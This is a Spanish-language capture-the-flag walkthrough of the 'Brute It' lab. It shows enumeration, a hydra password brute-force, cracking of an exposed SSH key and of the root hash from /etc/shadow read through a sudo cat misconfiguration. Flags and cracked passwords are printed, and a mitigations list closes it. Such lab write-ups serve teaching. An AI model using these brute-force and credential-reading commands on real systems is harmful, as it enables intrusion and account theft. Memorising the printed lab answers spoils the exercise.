# BRUTE-IT

> Dificultad: Fácil

#### FASE RECOPILACIÓN
* Primero comenzamos con el **Escaneo** del _Objetivo_:
    * `nmap -v -n --open -sV -sV --min-rate 5000 -Pn <IP>`
		
* Proseguimos con la **Enumeración**:
	* Web:
		* Buscamos los _Directorios_:
  			* `wfuzz -c --hc 400,403,404 --hh 275 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -R 3 -u "http://[IP]/FUZZ"`
				* Encontramos a _/admin_ únicamente	
			
		* Pasamos a enumerar los _Recursos_:
  			* `wfuzz -c --hc 400,403,404 --hh 275 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u "http://[IP]/admin/FUZZ"`
     			* Hallamos 3 de relevancia: 	
					* /admin/index.php
					* /admin/styles.cs
					* /admin/.zip		 
___		 
	
#### FASE EXPLOTACIÓN

* Web:
	* Sabiendo que el usuario de la web app es `admin` pasamos a crackear la contraseña de dicho usuario web:
    	* `hydra -l admin -P ../rockyou.txt [IP] http-post-form "/admin/index.php:user=admin&pass=^PASS^:Username or password invalid" -v -t 64`

		* Encontramos que las credenciales son `admin:xavier`. Tambien, la **Web Flag** es `THM{brut3_f0rce_is_e4sy}`.

* Sistema:
	* Hacemos click en el enlace para obtener la Clave Privada del usuario del sistema, que parece ser `john`. Nos lleva a dicho recurso, el cual pasamos a descargar con:
    	* `curl -O http://10.48.174.154/admin/panel/id_rsa`
    * Una vez lo tenemos, debemos _Crackear la Passphrase_ con John The Ripper, por lo cual hacemos:
    	* `chmod 600 id_rsa` (le damos permisos 600)
        * `ssh2john id_rsa > id_rsa.hash` (la convertimos a hash)
        * `john --wordlist=<rockyou.txt> id_rsa.hash` (crackeamos)
        * `id_rsa:rockinroll`
        * `(john --show id_rsa.hash)` (recuperamos el resultado)
	 
    * Ahora vamos a intentar loguearnos:
  		* `ssh -i id_rsa john@[IP]`
    	* Probamos la passphrase y éxito!
     	* Corremos `whoami` y comprobamos que somos `john`.

___

#### FASE POST-EXPLOTACIÓN (Escalar Privilegios):
Primero obtenemos la `User Flag`:
	* `cat user.txt` ==> `THM{a_password_is_not_a_barrier}`

Apenas tenemos **Footholding del Sistema**, una de las primeras cosas para _Elevar Privilegios_ es buscar **Privilegios Sudo**. Lo chequeamos con sudo -l:
    * (root) NOPASSWD: /bin/cat
        * GTFO Bins
            * `sudo -u root /bin/cat /etc/shadow`
                * `root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.`
                * IA ==> SHA512
                * nano shadow.txt
                    * `root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::`
                * `john -wordlist=[rockyou.txt] shadow.txt`
                    * `root:football`
                    * (john --show shadow.txt)
                - Root Flag:
                	- `cat root.txt`
                    	- THM{pr1v1l3g3_3sc4l4t10n}

___

#### MITIGACIONES
1. No dejar claves/archivos sensibles dentro de la webapp
2. No dar permisos elevados a usuarios regulares salvo que sea estrictamente necesario
3. Verificar que los binarios no tengan vulnerabilidades conocidas
4. No usar passwords débiles
